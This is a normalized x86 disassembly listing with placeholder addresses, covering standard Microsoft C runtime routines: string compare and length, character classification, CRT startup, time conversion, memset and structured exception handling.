pop ebx
leave
retn
cmp [ ebp - 0x4 ] ebx
jb r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov dl [ eax ]
test dl dl
je r-xdata
xor eax eax
movzx eax [ eax - 0x4 ]
movzx ecx [ ecx - 0x4 ]
jmp r-xdata
cmp dl [ ecx - 0x4 ]
jne r-xdata
movzx eax [ eax ]
movzx ecx [ ecx ]
cmp dl [ ecx ]
jne r-xdata
sub eax ecx
jmp r-xdata
mov dl [ eax - 0x3 ]
test dl dl
je r-xdata
pop edi
inc eax
inc ecx
inc [ ebp - 0x4 ]
movzx eax [ eax - 0x3 ]
movzx ecx [ ecx - 0x3 ]
jmp r-xdata
cmp dl [ ecx - 0x3 ]
jne r-xdata
mov dl [ eax - 0x2 ]
test dl dl
je r-xdata
movzx eax [ eax - 0x2 ]
movzx ecx [ ecx - 0x2 ]
jmp r-xdata
cmp dl [ ecx - 0x2 ]
jne r-xdata
mov dl [ eax - 0x1 ]
test dl dl
je r-xdata
movzx eax [ eax - 0x1 ]
movzx ecx [ ecx - 0x1 ]
jmp r-xdata
cmp dl [ ecx - 0x1 ]
jne r-xdata
add [ ebp - 0x4 ] 0x4
cmp [ ebp - 0x4 ] edi
jb r-xdata
mov dl [ eax ]
add eax 0x4
add ecx 0x4
test dl dl
je r-xdata
jmp r-xdata
sub_4426a4
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_441455
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x103
lea eax [ ebp - 0x10 ]
push eax
push 0x103
push [ ebp + 0x8 ]
call sub_44cda9
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_4426fa
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_4426a4
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x103
pop ebp
retn
sub_44272a
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_441455
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x4
lea eax [ ebp - 0x10 ]
push eax
push 0x4
push [ ebp + 0x8 ]
call sub_44cda9
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_44277b
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_44272a
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x4
pop ebp
retn
sub_4427a9
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_441455
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8
lea eax [ ebp - 0x10 ]
push eax
push 0x8
push [ ebp + 0x8 ]
call sub_44cda9
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_4427fa
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_4427a9
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x8
pop ebp
retn
sub_442828
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_441455
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x107
lea eax [ ebp - 0x10 ]
push eax
push 0x107
push [ ebp + 0x8 ]
call sub_44cda9
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_44287e
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_442828
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x107
pop ebp
retn
sub_4428ae
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x18 ]
call sub_441455
mov ebx [ ebp + 0x8 ]
mov esi 0x100
cmp ebx esi
jae r-xdata
mov eax [ ebp - 0x18 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov ecx [ ebp - 0x18 ]
cmp [ ecx + 0xac ] 0x1
jle r-xdata
call sub_443b37
mov [ eax ] 0x2a
xor ecx ecx
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x3 ] 0x0
inc ecx
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_44d943
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ecx + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
and eax 0x1
lea eax [ ebp - 0x18 ]
push eax
push 0x1
push ebx
call sub_44cda9
mov ecx [ ebp - 0x18 ]
add esp 0xc
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp eax 0x1
movzx eax [ ebp - 0x8 ]
je r-xdata
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x4 ] al
mov [ ebp - 0x3 ] bl
mov [ ebp - 0x2 ] 0x0
pop ecx
jmp r-xdata
mov eax [ ecx + 0xcc ]
movzx eax [ eax + ebx ]
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx ecx [ ebp - 0x7 ]
shl eax 0x8
or eax ecx
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x4 ]
lea edx [ ebp - 0x8 ]
push 0x3
push edx
push ecx
lea ecx [ ebp - 0x4 ]
push ecx
push esi
push [ eax + 0x14 ]
lea eax [ ebp - 0x18 ]
push eax
call sub_44d8fe
add esp 0x24
test eax eax
je r-xdata
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_4429c3
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_4428ae
pop ecx
pop ecx
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x41 ]
cmp ecx 0x19
ja r-xdata
pop ebp
retn
add eax 0x20
pop ebp
retn
sub_442a18
push 0x58
push r--data
call sub_4433dc
xor esi esi
mov [ ebp - 0x4 ] esi
lea eax [ ebp - 0x68 ]
push eax
call [ GetStartupInfoW@IAT ]
push 0xfffffffe
pop edi
mov [ ebp - 0x4 ] edi
mov eax 0x5a4d
cmp [ __dos_header ] ax
jne r-xdata
mov [ ebp - 0x1c ] esi
mov eax [ r--data ]
cmp [ eax + __dos_header ] 0x4550
jne r-xdata
call sub_4457b8
test eax eax
jne r-xdata
push 0x1c
call sub_4429ef
mov ecx 0x10b
cmp [ eax + r--data ] cx
jne r-xdata
call sub_44dd5e
mov [ ebp - 0x4 ] ebx
call sub_444725
test eax eax
jge r-xdata
push 0x10
call sub_4429ef
cmp [ eax + r--data ] 0xe
jbe r-xdata
call GetCommandLineW
mov [ rw-data ] eax
call sub_44dd01
mov [ rw-data ] eax
call sub_44dc53
test eax eax
jge r-xdata
push 0x1b
call sub_445acd
pop ecx
xor ecx ecx
cmp [ eax + r--data ] esi
setne cl
mov [ ebp - 0x1c ] ecx
jmp r-xdata
call sub_44da24
test eax eax
jge r-xdata
push 0x8
call sub_445acd
pop ecx
xor ebx ebx
inc ebx
push ebx
call sub_44873a
pop ecx
test eax eax
jne r-xdata
push ebx
call sub_445b8c
pop ecx
cmp eax esi
je r-xdata
push 0x9
call sub_445acd
pop ecx
call sub_44d9de
test [ ebp - 0x3c ] bl
je r-xdata
push eax
call sub_445acd
pop ecx
push 0xa
pop ecx
movzx ecx [ ebp - 0x38 ]
jmp r-xdata
call sub_445d69
mov [ ebp - 0x4 ] edi
jmp r-xdata
push eax
call sub_445d3d
push ecx
push eax
push esi
push __dos_header
call sub_40eac0
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x1c ] esi
jne r-xdata
mov eax [ ebp - 0x20 ]
jmp r-xdata
call sub_443421
retn
sub_442b56
mov esp [ ebp - 0x18 ]
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
call sub_445d78
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x20 ]
jmp r-xdata
push eax
call sub_445d53
call sub_443421
retn
sub_442b9f
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
mov [ ebp - 0x4 ] edi
cmp esi edi
jne r-xdata
push 0x24
push 0xff
push esi
call sub_443360
mov eax [ ebp + 0xc ]
add esp 0xc
cmp eax edi
je r-xdata
call sub_443b37
push 0x16
pop esi
push edi
push edi
push edi
push edi
push edi
mov [ eax ] esi
call sub_440791
add esp 0x14
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
cmp eax 0xffffffff
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] eax
jg r-xdata
pop edi
pop esi
leave
retn
cmp eax 0x7
jl r-xdata
jl r-xdata
push ebx
push edi
push 0x1e13380
push eax
push ecx
call sub_447f60
mov ecx eax
add ecx 0x46
lea eax [ ecx + 0x12b ]
cdq
mov ebx 0x190
idiv ebx
lea edi [ ecx - 0x1 ]
push 0x64
mov [ ebp - 0x8 ] edi
mov [ ebp + 0x8 ] ecx
mov ebx eax
mov eax edi
cdq
pop edi
idiv edi
push 0xffffffff
push 0xfffffe93
sub ebx eax
mov eax [ ebp - 0x8 ]
cdq
and edx 0x3
add eax edx
sar eax 0x2
lea eax [ ebx + eax - 0x11 ]
cdq
mov edi eax
lea eax [ ecx - 0x46 ]
mov ebx edx
cdq
push edx
push eax
call sub_44de40
sub eax edi
sbb edx ebx
push 0x0
mov ebx 0x15180
push ebx
push edx
push eax
call sub_44de40
mov edi [ ebp - 0x10 ]
add edi eax
adc [ ebp - 0xc ] edx
cmp [ ebp - 0xc ] 0x0
jg r-xdata
jg r-xdata
call sub_443b37
push 0x16
pop esi
mov [ eax ] esi
jmp r-xdata
cmp ecx 0xffff5740
jae r-xdata
mov eax [ ebp + 0x8 ]
mov ecx eax
and ecx 0x80000003
jns r-xdata
jl r-xdata
cmp ecx 0x934126cf
ja r-xdata
mov eax esi
jmp r-xdata
jne r-xdata
dec ecx
or ecx 0xfffffffc
inc ecx
mov eax [ ebp - 0x8 ]
add edi 0x1e13380
adc [ ebp - 0xc ] 0x0
mov ecx eax
and ecx 0x80000003
mov [ ebp + 0x8 ] eax
jns r-xdata
test edi edi
jae r-xdata
mov eax [ ebp + 0x8 ]
add eax 0x76c
cdq
mov ecx 0x190
idiv ecx
test edx edx
jne r-xdata
push 0x64
cdq
pop ecx
idiv ecx
test edx edx
jne r-xdata
jne r-xdata
dec ecx
or ecx 0xfffffffc
inc ecx
mov eax [ ebp + 0x8 ]
push 0x0
push ebx
push [ ebp - 0xc ]
mov [ esi + 0x14 ] eax
push edi
call sub_447f60
push 0xffffffff
mov [ esi + 0x1c ] eax
cdq
push 0xfffeae80
push edx
push eax
call sub_44de40
add edi eax
adc [ ebp - 0xc ] edx
cmp [ ebp - 0x4 ] 0x0
mov edx rw-data
jne r-xdata
mov [ ebp - 0x4 ] 0x1
add eax 0x76c
cdq
mov ecx 0x190
idiv ecx
test edx edx
jne r-xdata
push 0x64
cdq
pop ecx
idiv ecx
test edx edx
jne r-xdata
mov eax [ esi + 0x1c ]
xor ecx ecx
inc ecx
cmp [ edx + 0x4 ] eax
jge r-xdata
mov edx rw-data
add edi ebx
adc [ ebp - 0xc ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
dec ecx
mov [ esi + 0x10 ] ecx
sub eax [ edx + ecx * 4 ]
push 0x0
mov [ esi + 0xc ] eax
mov eax [ ebp + 0xc ]
push ebx
push [ eax + 0x4 ]
push [ eax ]
call sub_447f60
push 0x7
add eax 0x4
pop ecx
cdq
idiv ecx
xor ebx ebx
push ebx
push 0xe10
push [ ebp - 0xc ]
push edi
mov [ esi + 0x18 ] edx
call sub_447f60
push 0xffffffff
mov [ esi + 0x8 ] eax
cdq
push 0xfffff1f0
push edx
push eax
call sub_44de40
push ebx
add edi eax
adc [ ebp - 0xc ] edx
push 0x3c
push [ ebp - 0xc ]
push edi
call sub_447f60
mov [ esi + 0x4 ] eax
imul eax eax 0x3c
sub edi eax
mov [ esi + 0x20 ] ebx
mov [ esi ] edi
xor eax eax
pop ebx
mov ebx eax
inc ecx
cmp [ edx + ecx * 4 ] ebx
jl r-xdata
mov ebx 0x15180
sub_442de2
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
push 0x1
push 0x0
push 0x0
push [ ebp - 0x4 ]
call sub_44de40
mov ecx [ ebp - 0x8 ]
xor esi esi
add eax ecx
adc edx esi
mov [ rw-data ] eax
mov [ rw-data ] edx
xor eax eax
pop esi
leave
retn
sub_442e20
mov ecx [ esp + 0x4 ]
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
add ecx 0x1
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea eax [ ecx - 0x1 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ecx 0x3
jne r-xdata
lea eax [ ecx - 0x4 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ah ah
je r-xdata
add eax 0x0
lea esp [ esp ]
lea esp [ esp ]
lea eax [ ecx - 0x3 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff0000
je r-xdata
lea eax [ ecx - 0x2 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff000000
je r-xdata
jmp r-xdata
sub_442eab
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push esi
push edi
push 0x8
pop ecx
mov esi r--data
lea edi [ ebp - 0x20 ]
[ edi ] [ esi ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
pop edi
mov [ ebp - 0x4 ] eax
pop esi
test eax eax
je r-xdata
lea eax [ ebp - 0xc ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call [ RaiseException@IAT ]
leave
retn 0x8
test [ eax ] 0x8
je r-xdata
mov [ ebp - 0xc ] 0x1994000
sub_442ef7
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov ebp [ ebp - 0x4 ]
mov esp [ ebx - 0x4 ]
jmp eax
sub_442f30
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov esi [ fs : 0x0 ]
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x8 ] r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call RtlUnwind
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
and eax 0xfffffffd
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
mov edi [ fs : 0x0 ]
mov ebx [ ebp - 0x4 ]
mov [ ebx ] edi
mov [ fs : 0x0 ] ebx
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_442f84
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
cld
mov [ ebp - 0x4 ] eax
xor eax eax
push eax
push eax
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_44ea47
add esp 0x20
mov [ ebp - 0x8 ] eax
pop edi
pop esi
pop ebx
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_442fba
mov edi edi
push ebp
mov ebp esp
push esi
cld
mov esi [ ebp + 0xc ]
mov ecx [ esi + 0x8 ]
xor ecx esi
call sub_43f96b
push 0x0
push esi
push [ esi + 0x14 ]
push [ esi + 0xc ]
push 0x0
push [ ebp + 0x10 ]
push [ esi + 0x10 ]
push [ ebp + 0x8 ]
call sub_44ea47
add esp 0x20
pop esi
pop ebp
retn
sub_442fed
mov edi edi
push ebp
mov ebp esp
sub esp 0x38
push ebx
cmp [ ebp + 0x8 ] 0x123
jne r-xdata
and [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] sub_4430c4
mov eax [ rw-data ]
lea ecx [ ebp - 0x28 ]
xor eax ecx
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x10 ] eax
and [ ebp - 0xc ] 0x0
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0xc ] esp
mov [ ebp - 0x8 ] ebp
mov eax [ fs : 0x0 ]
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x38 ] 0x1
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x34 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x30 ] eax
call sub_445601
mov eax [ eax + 0x80 ]
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x34 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax ]
call [ ebp - 0x2c ]
pop ecx
pop ecx
and [ ebp - 0x38 ] 0x0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax r-xdata
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov ebx [ ebp - 0x28 ]
mov [ ebx ] eax
mov [ fs : 0x0 ] ebx
jmp r-xdata
pop ebx
leave
retn
mov eax [ ebp - 0x38 ]
sub_4430c4
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
cld
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x8 ]
xor ecx [ ebp + 0xc ]
call sub_43f96b
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0x66
je r-xdata
push 0x1
mov eax [ ebp + 0xc ]
push [ eax + 0x18 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x14 ]
mov eax [ ebp + 0xc ]
push [ eax + 0xc ]
push 0x0
push [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x10 ]
push [ ebp + 0x8 ]
call sub_44ea47
add esp 0x20
mov eax [ ebp + 0xc ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
xor eax eax
inc eax
jmp r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x123
call sub_442fed
add esp 0x1c
mov eax [ ebp - 0x4 ]
mov ebx [ ebp + 0xc ]
mov esp [ ebx + 0x1c ]
mov ebp [ ebx + 0x20 ]
jmp eax
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_442f30
pop ebx
leave
retn
sub_443163
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x10 ]
mov esi [ edi + 0xc ]
mov [ ebp - 0x4 ] eax
mov ebx esi
jmp r-xdata
mov [ ebp + 0x8 ] esi
cmp esi 0xffffffff
jne r-xdata
mov eax [ ebp + 0x14 ]
inc esi
mov [ eax ] esi
mov eax [ ebp + 0x18 ]
mov [ eax ] ebx
cmp ebx [ edi + 0xc ]
ja r-xdata
mov ecx [ ebp - 0x4 ]
dec esi
mov eax esi
imul eax eax 0x14
add eax ecx
mov ecx [ ebp + 0x10 ]
cmp [ eax + 0x4 ] ecx
jge r-xdata
call sub_44b12a
call sub_44b12a
cmp esi ebx
jbe r-xdata
cmp esi 0xffffffff
jne r-xdata
cmp ecx [ eax + 0x8 ]
jle r-xdata
mov eax esi
imul eax eax 0x14
add eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp + 0xc ] 0x0
jge r-xdata
dec [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
sub_4431d8
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ esi ] eax
call sub_445601
mov eax [ eax + 0x98 ]
mov [ esi + 0x4 ] eax
call sub_445601
mov [ eax + 0x98 ] esi
mov eax esi
pop esi
pop ebp
retn
sub_443204
mov edi edi
push ebp
mov ebp esp
call sub_445601
mov eax [ eax + 0x98 ]
jmp r-xdata
test eax eax
jne r-xdata
mov ecx [ eax ]
cmp ecx [ ebp + 0x8 ]
je r-xdata
inc eax
pop ebp
retn
xor eax eax
pop ebp
retn
mov eax [ eax + 0x4 ]
sub_44322b
mov edi edi
push ebp
mov ebp esp
push esi
call sub_445601
mov esi [ ebp + 0x8 ]
cmp esi [ eax + 0x98 ]
jne r-xdata
call sub_445601
mov eax [ eax + 0x98 ]
jmp r-xdata
call sub_445601
mov ecx [ esi + 0x4 ]
mov [ eax + 0x98 ] ecx
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov ecx [ eax + 0x4 ]
cmp esi ecx
je r-xdata
pop esi
pop ebp
jmp sub_44b12a
mov ecx [ esi + 0x4 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
mov eax ecx
pop esi
pop ebp
retn
sub_44327d
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
and [ ebp - 0x18 ] 0x0
lea ecx [ ebp - 0x18 ]
xor eax ecx
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x14 ]
inc eax
mov [ ebp - 0x14 ] sub_442fba
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov eax [ fs : 0x0 ]
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
push [ ebp + 0x18 ]
push ecx
push [ ebp + 0x10 ]
call sub_44eb30
mov ecx eax
mov eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
mov eax ecx
leave
retn
sub_4432dd
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_443310
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
mov [ ebp - 0x10 ] esp
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_443360
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
test edx edx
je r-xdata
mov eax [ esp + 0x4 ]
retn
xor eax eax
mov al [ esp + 0x8 ]
test al al
jne r-xdata
push edi
mov edi ecx
cmp edx 0x4
jb r-xdata
cmp edx 0x100
jb r-xdata
mov [ edi ] al
add edi 0x1
sub edx 0x1
jne r-xdata
neg ecx
and ecx 0x3
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov ecx eax
shl eax 0x8
add eax ecx
mov ecx eax
shl eax 0x10
add eax ecx
mov ecx edx
and edx 0x3
shr ecx 0x2
je r-xdata
sub edx ecx
jmp sub_44ebd3
[ edi ]
test edx edx
je r-xdata
mov [ edi ] al
add edi 0x1
sub ecx 0x1
jne r-xdata
sub_4433dc
push sub_443440
push [ fs : 0x0 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x4 ] eax
xor eax ebp
push eax
mov [ ebp - 0x18 ] esp
push [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
retn
sub_443440
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebx + 0x8 ]
xor esi [ rw-data ]
push edi
mov eax [ esi ]
mov [ ebp - 0x1 ] 0x0
mov [ ebp - 0xc ] 0x1
lea edi [ ebx + 0x10 ]
cmp eax 0xfffffffe
je r-xdata
mov ecx [ esi + 0xc ]
mov eax [ esi + 0x8 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_43f96b
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x66
jne r-xdata
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_43f96b
mov edx 0xfffffffe
cmp [ ebx + 0xc ] edx
je r-xdata
mov ecx [ ebp + 0x10 ]
lea edx [ ebp - 0x18 ]
mov [ ebx - 0x4 ] edx
mov ebx [ ebx + 0xc ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ecx
cmp ebx 0xfffffffe
je r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push rw-data
push edi
mov ecx ebx
call sub_4443f8
jmp r-xdata
lea ecx [ ecx ]
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
mov ebx eax
cmp eax 0xfffffffe
jne r-xdata
mov edx edi
call sub_4443ae
mov [ ebp - 0x1 ] 0x1
test eax eax
jl r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_43f96b
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_43f96b
lea eax [ ebx + ebx * 2 ]
mov ecx [ esi + eax * 4 + 0x14 ]
lea eax [ esi + eax * 4 + 0x10 ]
mov [ ebp - 0x10 ] eax
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
test ecx ecx
je r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0xc ] 0x0
jmp r-xdata
jg r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx ] 0xe06d7363
jne r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
call sub_4443de
mov eax [ ebp + 0xc ]
cmp [ eax + 0xc ] ebx
je r-xdata
cmp [ r--data ] 0x0
je r-xdata
mov ecx [ ebp - 0x8 ]
mov [ eax + 0xc ] ecx
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
push rw-data
push edi
mov edx ebx
mov ecx eax
call sub_4443f8
mov eax [ ebp + 0xc ]
push r--data
call sub_4459e0
add esp 0x4
test eax eax
je r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_43f96b
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x8 ]
mov edx edi
call sub_4443c5
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_43f96b
mov edx [ ebp + 0x8 ]
